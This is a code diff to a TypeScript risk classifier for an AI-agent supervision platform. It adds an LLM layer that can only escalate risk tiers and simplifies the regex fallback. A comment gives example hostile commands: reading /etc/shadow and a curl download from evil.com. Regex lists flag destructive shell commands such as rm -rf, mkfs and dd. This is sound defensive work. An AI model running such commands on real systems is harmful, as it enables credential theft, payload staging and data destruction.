@@ -1,8 +1,12 @@
 /**
  * Risk classifier.
  *
- * Inspects the tool name and arguments to assign a RiskTier and business-context
- * category. This keeps risk assessment deterministic and auditable.
+ * Two-layer system:
+ *   1. Structural classification — fast, based on tool type (what KIND of tool is it?)
+ *   2. AI classification — smart, understands WHAT the action actually does
+ *
+ * The structural layer gets a baseline. The AI layer can ESCALATE (never downgrade).
+ * If AI is unavailable, falls back to structural only.
  */
 
 import { RiskTier } from '@wooblay/types';
@@ -23,141 +27,162 @@ export type BusinessCategory =
   | 'data'           // database queries, data manipulation
   | 'other';         // unknown/unclassified
 
-const CODE_EXTENSIONS = /\.(ts|tsx|js|jsx|py|rb|go|rs|java|c|cpp|h|css|scss|html|vue|svelte|json|yaml|yml|toml|md|sql)$/i;
-const SECRET_PATTERNS = [/\.env/, /credential/i, /secret/i, /password/i, /\.pem$/, /\.key$/, /id_rsa/, /api[_-]?key/i, /token/i, /\.aws\//];
-const INFRA_PATTERNS = [/docker/i, /deploy/i, /ci[/-]cd/i, /nginx/i, /systemd/i, /terraform/i, /ansible/i, /k8s/i, /kubernetes/i];
+// ── AI Risk Classification ───────────────────────────────────────────────────
 
-/**
- * Classify a tool call into a business-context category.
- * Heuristic-first (fast, regex-based). AI enrichment runs async.
- */
-export function classifyCategory(
-  toolName: string,
-  args: Record<string, unknown>,
-): BusinessCategory {
-  const normalized = toolName.replace(/^(wooblay_|gated_)/, '');
-  const command = String(args['command'] ?? args['cmd'] ?? '');
-  const path = String(args['path'] ?? args['file'] ?? args['filepath'] ?? '');
-  const url = String(args['url'] ?? '');
-  const allArgs = JSON.stringify(args).toLowerCase();
-
-  // Check for secrets access first (highest priority)
-  for (const pattern of SECRET_PATTERNS) {
-    if (pattern.test(path) || pattern.test(command) || pattern.test(allArgs)) {
-      return 'secrets';
-    }
-  }
-
-  // Destructive operations
-  if (normalized === 'exec' || normalized === 'process') {
-    for (const p of DESTRUCTIVE_PATTERNS) {
-      if (p.test(command)) return 'destructive';
-    }
-  }
-
-  // Git operations
-  if (/\bgit\s+(push|commit|merge|rebase|pull|clone|checkout|branch|tag|stash|reset|cherry-pick)\b/.test(command)) {
-    return 'git';
-  }
-
-  // Package management
-  if (/\b(npm|yarn|pnpm|pip|cargo|gem|composer|brew)\s+(install|add|remove|uninstall|update|upgrade|publish)\b/.test(command)) {
-    return 'packages';
-  }
-
-  // Infrastructure
-  for (const p of INFRA_PATTERNS) {
-    if (p.test(command) || p.test(path)) return 'infra';
-  }
-
-  // Network operations
-  if (['http', 'web_fetch', 'web_search'].includes(normalized)) {
-    return 'network';
-  }
-  if (url && (url.startsWith('http') || url.startsWith('//'))) {
-    return 'network';
-  }
-
-  // Communication / agent coordination
-  if (['sessions_spawn', 'sessions_send', 'message'].includes(normalized)) {
-    return 'communication';
-  }
-
-  // File operations — distinguish code from generic files
-  if (['write', 'edit', 'apply_patch'].includes(normalized)) {
-    if (CODE_EXTENSIONS.test(path)) return 'code';
-    return 'files';
-  }
-  if (normalized === 'read') {
-    if (CODE_EXTENSIONS.test(path)) return 'code';
-    return 'files';
-  }
-
-  // Shell commands (general exec that didn't match above)
-  if (normalized === 'exec' || normalized === 'process') {
-    return 'shell';
-  }
-
-  // Browser
-  if (normalized === 'browser') return 'network';
-
-  return 'other';
+export interface AIRiskResult {
+  riskTier: RiskTier;
+  category: BusinessCategory;
+  reasoning: string;
+  description: string;      // human-readable "what this does"
+  whyReview: string | null;  // human-readable "why this needs review" (null = no concern)
 }
 
-/** Patterns that indicate a destructive shell command. */
+/**
+ * AI-powered risk and category classification.
+ * Returns null if AI is unavailable — caller should fall back to structural.
+ *
+ * This is the "smart" layer. It understands intent:
+ *   - `cat /etc/shadow` → secrets, WRITE (it knows shadow has password hashes)
+ *   - `curl http://evil.com/exploit.sh -o /tmp/x` → network, DESTRUCTIVE (download + stage)
+ *   - `ls -la` → files, READ (obviously harmless)
+ *
+ * The AI is fast because we use low max_tokens and temperature 0.
+ */
+export async function classifyWithAI(
+  toolName: string,
+  args: Record<string, unknown>,
+  structuralRisk: RiskTier,
+  structuralCategory: BusinessCategory,
+): Promise<AIRiskResult | null> {
+  // Dynamic import to avoid circular deps and keep this module loadable without OpenAI
+  const { config } = await import('../config.js');
+  if (!config.OPENAI_API_KEY) return null;
+
+  const { default: OpenAI } = await import('openai');
+  const client = new OpenAI({ apiKey: config.OPENAI_API_KEY });
+
+  const argsStr = JSON.stringify(args).slice(0, 800);
+  const normalized = toolName.replace(/^(wooblay_|gated_)/, '');
+
+  try {
+    const response = await client.chat.completions.create({
+      model: config.OPENAI_MODEL ?? 'gpt-4o-mini',
+      temperature: 0,
+      max_tokens: 200,
+      messages: [
+        {
+          role: 'system',
+          content: `You are the AI security layer for an agent supervision platform. An AI agent is trying to execute a tool call. You must:
+
+1. CLASSIFY the risk:
+   - riskTier: "READ" (no side effects), "WRITE" (modifies state, accesses sensitive data, downloads), or "DESTRUCTIVE" (irreversible damage)
+   - category: one of: code, git, packages, shell, files, network, secrets, infra, communication, destructive, data, other
+
+2. DESCRIBE what this action does in plain English for a non-technical human. Be specific about WHAT it affects and WHY someone should care. Don't be generic — translate the technical action into its real-world impact.
+   Examples: "Reads the system password file containing encrypted passwords for all users" not "Reads a file"
+   "Installs 3 npm packages including a database driver" not "Runs a command"
+
+3. If this needs human review, explain WHY in one sentence a manager would understand. If it's safe/routine, set whyReview to null.
+
+Key classification rules:
+- Reading sensitive files (passwords, keys, credentials, system config) = WRITE + secrets
+- Downloading from the internet = at least WRITE + network  
+- Download + execute (pipe to shell) = DESTRUCTIVE
+- sudo, mass deletion, disk formatting = DESTRUCTIVE
+- Normal dev work (editing code, tests, git commit) = appropriate lower tier
+
+Respond JSON ONLY:
+{"riskTier":"...","category":"...","description":"...","reasoning":"...","whyReview":"...or null"}`,
+        },
+        {
+          role: 'user',
+          content: `Tool: ${normalized}\nArgs: ${argsStr}`,
+        },
+      ],
+    });
+
+    const text = response.choices[0]?.message?.content ?? '';
+    const jsonMatch = text.match(/\{[\s\S]*?\}/);
+    if (!jsonMatch) return null;
+
+    const result = JSON.parse(jsonMatch[0]);
+
+    // Validate and normalize
+    const validTiers = ['READ', 'WRITE', 'DESTRUCTIVE'];
+    const aiTier = validTiers.includes(result.riskTier) ? result.riskTier as RiskTier : structuralRisk;
+    const aiCategory = result.category as BusinessCategory || structuralCategory;
+
+    // AI can only ESCALATE risk, never downgrade (safety principle)
+    const tierOrder = { READ: 0, WRITE: 1, DESTRUCTIVE: 2 };
+    const finalTier = tierOrder[aiTier] >= tierOrder[structuralRisk] ? aiTier : structuralRisk;
+
+    return {
+      riskTier: finalTier,
+      category: aiCategory,
+      reasoning: result.reasoning ?? '',
+      description: result.description ?? '',
+      whyReview: result.whyReview ?? null,
+    };
+  } catch (err) {
+    console.warn('[risk] AI classification failed, using structural fallback:', err);
+    return null;
+  }
+}
+
+// ── Structural Classification (fast fallback) ────────────────────────────────
+
+const CODE_EXTENSIONS = /\.(ts|tsx|js|jsx|py|rb|go|rs|java|c|cpp|h|css|scss|html|vue|svelte|json|yaml|yml|toml|md|sql)$/i;
+
+/** Patterns for obviously destructive commands (minimal — AI handles the rest). */
 const DESTRUCTIVE_PATTERNS = [
-  /\brm\s+(-\w*)?-r/,  // rm -rf, rm -r
-  /\brm\s+(-\w*)?-f/,  // rm -f
+  /\brm\s+(-\w*)?-r/,
+  /\brm\s+(-\w*)?-f/,
   /\bsudo\b/,
   /\bmkfs\b/,
   /\bdd\b\s+/,
-  /\bformat\b/,
-  /\bfdisk\b/,
   /\bshutdown\b/,
   /\breboot\b/,
   /\bchmod\s+777\b/,
   />\s*\/dev\//,
 ];
 
-/** Patterns that indicate a write-level shell command. */
+/** Patterns for write-level commands. */
 const WRITE_PATTERNS = [
   /\bmv\b/,
   /\bcp\b/,
   /\bmkdir\b/,
-  /\btouch\b/,
   /\bchmod\b/,
   /\bchown\b/,
   /\btee\b/,
   /\bsed\b.*-i/,
-  /\bawk\b.*-i\s+inplace/,
   /\bgit\s+(push|commit|merge|rebase)\b/,
   /\bnpm\s+(publish|install)\b/,
   /\bpip\s+install\b/,
-  />>?\s/,  // stdout/stderr redirection
+  />>?\s/,
 ];
 
 /**
- * Classify the risk tier of a tool call based on the tool name and arguments.
+ * Structural risk classification — fast, deterministic, based on tool type.
+ * This is the baseline. AI enrichment can escalate it.
  */
 export function classifyRisk(
   toolName: string,
   args: Record<string, unknown>,
 ): RiskTier {
-  // Normalize tool name: support both Wooblay-prefixed (wooblay_exec)
-  // and native agent tool names (exec, process, browser, etc.)
   const normalized = toolName.replace(/^wooblay_/, '');
 
   switch (normalized) {
     case 'exec':
     case 'process': {
       const command = String(args['command'] ?? args['cmd'] ?? '');
-      // Check destructive first (superset of write)
       for (const pattern of DESTRUCTIVE_PATTERNS) {
         if (pattern.test(command)) return RiskTier.DESTRUCTIVE;
       }
       for (const pattern of WRITE_PATTERNS) {
         if (pattern.test(command)) return RiskTier.WRITE;
       }
+      // Shell commands that aren't obviously write/destructive default to READ
+      // but the AI layer will catch things like `cat /etc/shadow`
       return RiskTier.READ;
     }
 
@@ -165,21 +190,14 @@ export function classifyRisk(
     case 'web_fetch':
     case 'web_search': {
       const method = String(args['method'] ?? 'GET').toUpperCase();
-      if (method === 'GET' || method === 'HEAD' || method === 'OPTIONS') {
-        return RiskTier.READ;
-      }
-      if (method === 'DELETE') {
-        return RiskTier.DESTRUCTIVE;
-      }
-      // POST, PUT, PATCH
+      if (method === 'GET' || method === 'HEAD' || method === 'OPTIONS') return RiskTier.READ;
+      if (method === 'DELETE') return RiskTier.DESTRUCTIVE;
       return RiskTier.WRITE;
     }
 
     case 'browser':
-      // Browser automation can mutate external state
       return RiskTier.WRITE;
 
-    // File operations — classify by nature
     case 'read':
       return RiskTier.READ;
 
@@ -188,19 +206,61 @@ export function classifyRisk(
     case 'apply_patch':
       return RiskTier.WRITE;
 
-    // Agent coordination — classify as WRITE (spawns sub-agents / sends messages)
     case 'sessions_spawn':
     case 'sessions_send':
     case 'message':
       return RiskTier.WRITE;
 
-    // System tools
     case 'cron':
     case 'gateway':
       return RiskTier.WRITE;
 
     default:
-      // Unknown tools default to WRITE for safety
       return RiskTier.WRITE;
   }
+}
+
+/**
+ * Structural category classification — fast, regex-based fallback.
+ * Used when AI is unavailable.
+ */
+export function classifyCategory(
+  toolName: string,
+  args: Record<string, unknown>,
+): BusinessCategory {
+  const normalized = toolName.replace(/^(wooblay_|gated_)/, '');
+  const command = String(args['command'] ?? args['cmd'] ?? '');
+  const path = String(args['path'] ?? args['file'] ?? args['filepath'] ?? '');
+
+  // Destructive
+  if (normalized === 'exec' || normalized === 'process') {
+    for (const p of DESTRUCTIVE_PATTERNS) {
+      if (p.test(command)) return 'destructive';
+    }
+  }
+
+  // Git
+  if (/\bgit\s+(push|commit|merge|rebase|pull|clone|checkout|branch)\b/.test(command)) return 'git';
+
+  // Packages
+  if (/\b(npm|yarn|pnpm|pip|cargo|gem|composer|brew)\s+(install|add|remove|update|publish)\b/.test(command)) return 'packages';
+
+  // Network
+  if (['http', 'web_fetch', 'web_search'].includes(normalized)) return 'network';
+  if (/\b(curl|wget)\b/.test(command)) return 'network';
+
+  // Communication
+  if (['sessions_spawn', 'sessions_send', 'message'].includes(normalized)) return 'communication';
+
+  // File ops — code vs generic
+  if (['write', 'edit', 'apply_patch', 'read'].includes(normalized)) {
+    return CODE_EXTENSIONS.test(path) ? 'code' : 'files';
+  }
+
+  // Shell fallback
+  if (normalized === 'exec' || normalized === 'process') return 'shell';
+
+  if (normalized === 'browser') return 'network';
+
+  return 'other';
 }
